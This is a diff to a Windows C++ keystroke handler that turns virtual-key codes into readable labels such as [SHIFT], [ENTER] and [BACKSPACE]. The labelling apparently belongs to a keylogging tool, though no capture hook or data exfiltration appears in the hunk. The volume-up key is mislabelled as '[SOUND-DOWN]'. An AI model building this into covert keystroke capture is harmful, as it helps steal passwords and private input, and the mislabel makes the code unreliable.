@@ -49,9 +49,136 @@ bool WinHandleKeyStroke (std::wstring &input, int scannedKey) {
 
     if (scannedKey >= 39 && scannedKey < 91) {
         WinScannedKeyTranslate(input, scannedKey);
+        return true;
     }
 
-    return true;
+    switch (scannedKey) {
+        case VK_SPACE:
+            input.append(L" ");
+            return true;
+        case VK_SHIFT:
+            input.append(L"[SHIFT]");
+            return true;
+        case VK_RETURN:
+            input.append(L"[ENTER]");
+            return true;
+        case VK_BACK:
+            input.append(L"[BACKSPACE]");
+            return true;
+        case VK_TAB:
+            input.append(L"[TAB]");
+            return true;
+        case VK_CONTROL:
+            input.append(L"[CTRL]");
+            return true;
+        case VK_DELETE:
+            input.append(L"[DEL]");
+            return true;
+        case VK_OEM_1:
+            WinScannedKeyTranslate(input, VK_OEM_1);
+            return true;
+        case VK_OEM_2:
+            WinScannedKeyTranslate(input, VK_OEM_2);
+            return true;
+        case VK_OEM_3:
+            WinScannedKeyTranslate(input, VK_OEM_3);
+            return true;
+        case VK_OEM_4:
+            WinScannedKeyTranslate(input, VK_OEM_4);
+            return true;
+        case VK_OEM_5:
+            WinScannedKeyTranslate(input, VK_OEM_5);
+            return true;
+        case VK_OEM_6:
+            WinScannedKeyTranslate(input, VK_OEM_6);
+            return true;
+        case VK_OEM_7:
+            WinScannedKeyTranslate(input, VK_OEM_7);
+            return true;
+        case VK_OEM_PLUS:
+            input.append(L"+");
+            return true;
+        case VK_OEM_COMMA:
+            WinScannedKeyTranslate(input, VK_OEM_COMMA);
+            return true;
+        case VK_OEM_MINUS:
+            input.append(L"-");
+            return true;
+        case VK_OEM_PERIOD:
+            WinScannedKeyTranslate(input, VK_OEM_PERIOD);
+            return true;
+        case VK_NUMPAD0:
+            input.append(L"0");
+            return true;
+        case VK_NUMPAD1:
+            input.append(L"1");
+            return true;
+        case VK_NUMPAD2:
+            input.append(L"2");
+            return true;
+        case VK_NUMPAD3:
+            input.append(L"3");
+            return true;
+        case VK_NUMPAD4:
+            input.append(L"4");
+            return true;
+        case VK_NUMPAD5:
+            input.append(L"5");
+            return true;
+        case VK_NUMPAD6:
+            input.append(L"6");
+            return true;
+        case VK_NUMPAD7:
+            input.append(L"7");
+            return true;
+        case VK_NUMPAD8:
+            input.append(L"8");
+            return true;
+        case VK_NUMPAD9:
+            input.append(L"9");
+            return true;
+        case VK_CAPITAL:
+            input.append(L"[CAPS LOCK]");
+            return true;
+        case VK_PRIOR:
+            input.append(L"[PAGE UP]");
+            return true;
+        case VK_NEXT:
+            input.append(L"[PAGE DOWN]");
+            return true;
+        case VK_END:
+            input.append(L"[END]");
+            return true;
+        case VK_HOME:
+            input.append(L"[HOME]");
+            return true;
+        case VK_LWIN:
+            input.append(L"[WIN]");
+            return true;
+        case VK_RWIN:
+            input.append(L"[WIN]");
+            return true;
+        case VK_VOLUME_MUTE:
+            input.append(L"[SOUND-MUTE]");
+            return true;
+        case VK_VOLUME_DOWN:
+            input.append(L"[SOUND-DOWN]");
+            return true;
+        case VK_VOLUME_UP:
+            input.append(L"[SOUND-DOWN]");
+            return true;
+        case VK_MEDIA_PLAY_PAUSE:
+            input.append(L"[MEDIA-PLAY/PAUSE]");
+            return true;
+        case VK_MEDIA_STOP:
+            input.append(L"[MEDIA-STOP]");
+            return true;
+        case VK_MENU:
+            input.append(L"[ALT]");
+            return true;
+    }
+
+    return false;
 }
 
 void WinScannedKeyTranslate (std::wstring &input, int scannedKey) {
